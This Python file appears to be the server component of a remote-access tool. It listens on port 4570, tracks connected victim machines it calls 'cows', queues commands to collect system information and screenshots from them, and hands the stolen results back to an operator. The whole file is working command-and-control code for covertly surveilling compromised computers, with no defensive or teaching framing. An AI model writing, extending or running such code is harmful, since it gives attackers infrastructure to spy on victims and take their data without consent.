import socket

ip = '0.0.0.0'
port = 4570

DeviceIDList = []
DeviceIPList = []
pending_command = {}
response_buffer = {}

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((ip, port))
server_socket.listen(5)

def print_boxed(text, r=20, g=200, b=20):
    box_width = 60  # Fixed width of the box
    padding = 2     # Padding for text inside the box
    
    # Create the top and bottom borders
    top_border = "╔" + "═" * (box_width - 2) + "╗"
    bottom_border = "╚" + "═" * (box_width - 2) + "╝"
    
    # Add '>' before the text
    text = f"> {text}"

    # Ensure the text fits within the box
    if len(text) > box_width - 2:
        text = text[:box_width - 4]  # Truncate text if it's too long
        text = f"{text[:box_width - 4]}..."  # Add ellipsis for truncated text

    # Add left and right borders around the text
    text_line = "║ " + text.center(box_width - 4) + " ║"

    # Set the RGB color using ANSI escape codes
    rgb_color = f"\033[38;2;{r};{g};{b}m"
    
    # Print the full box with RGB colored text
    colored_top = f"{rgb_color}{top_border}\033[0m"
    colored_text = f"{rgb_color}{text_line}\033[0m"
    colored_bottom = f"{rgb_color}{bottom_border}\033[0m"

    print(colored_top)
    print(colored_text)
    print(colored_bottom)

# ╔════════════════════════════════════════════════════════════════════╗
# ║ > Server listening on all interfaces at this port                  ║
# ╚════════════════════════════════════════════════════════════════════╝
print_boxed(f"Server listening on {ip}:{port}")

while True:
    client_socket, address = server_socket.accept()
    msg = client_socket.recv(4096).decode()

    lines = msg.splitlines()

    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Handle :CLIENTPING Command                                       ║
    # ╚════════════════════════════════════════════════════════════════════╝
    if msg.startswith(":CLIENTPING"):
        name = lines[1]
        ip_addr = lines[2]
        if name not in DeviceIDList:
            DeviceIDList.append(name)
            DeviceIPList.append(ip_addr)
            print_boxed(f"New cow: {name} at {ip_addr}")

        if pending_command.get(name):
            command = pending_command.pop(name)
            client_socket.send(command.encode())
        else:
            client_socket.send(b":NOOP")

    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Handle :PCINFO Command                                           ║
    # ╚════════════════════════════════════════════════════════════════════╝
    elif msg.startswith(":PCINFO"):
        name = lines[1]
        info = "\n".join(lines[2:])
        print_boxed(f"Received PCINFO from {name}.")
        if name not in response_buffer:
            response_buffer[name] = {}
        response_buffer[name]["GETINFO"] = info

    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Handle :SCREENSHOT Command                                       ║
    # ╚════════════════════════════════════════════════════════════════════╝
    elif msg.startswith(":SCREENSHOT"):
        name = lines[1]
        link = lines[2]
        print_boxed(f"Received SCREENSHOT from {name}.")
        print_boxed(link)

        if name not in response_buffer:
            response_buffer[name] = {}
        response_buffer[name]["GETSCREENSHOT"] = link

    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Handle :GETINFO Command                                          ║
    # ╚════════════════════════════════════════════════════════════════════╝
    elif msg.startswith(":GETINFO"):
        target = lines[1]
        pending_command[target] = ":COMMAND :GETINFO"
        print_boxed(f"Queued :GETINFO for {target}")

    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Handle :GETSCREENSHOT Command                                    ║
    # ╚════════════════════════════════════════════════════════════════════╝
    elif msg.startswith(":GETSCREENSHOT"):
        target = lines[1]
        pending_command[target] = ":COMMAND :GETSCREENSHOT"
        print_boxed(f"Queued :GETSCREENSHOT for {target}")

    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Handle :LISTCOWS Command                                         ║
    # ╚════════════════════════════════════════════════════════════════════╝
    elif msg.startswith(":LISTCOWS"):
        print_boxed("List of cows:")
        for cow in DeviceIDList:
            print_boxed(f"{cow}!")
            cows_list = f"{cow}\n" 
            client_socket.sendall(cows_list.encode())

    # ╔════════════════════════════════════════════════════════════════════╗
    # ║ > Handle :FETCHRESPONSE Command                                    ║
    # ╚════════════════════════════════════════════════════════════════════╝
    elif msg.startswith(":FETCHRESPONSE"):
        target = lines[1]
        command = lines[2]

        if target in response_buffer and command in response_buffer[target]:
            client_socket.sendall(response_buffer[target][command].encode())
            del response_buffer[target][command]
        else:
            client_socket.send(b"No response available yet.\n")

    client_socket.close()
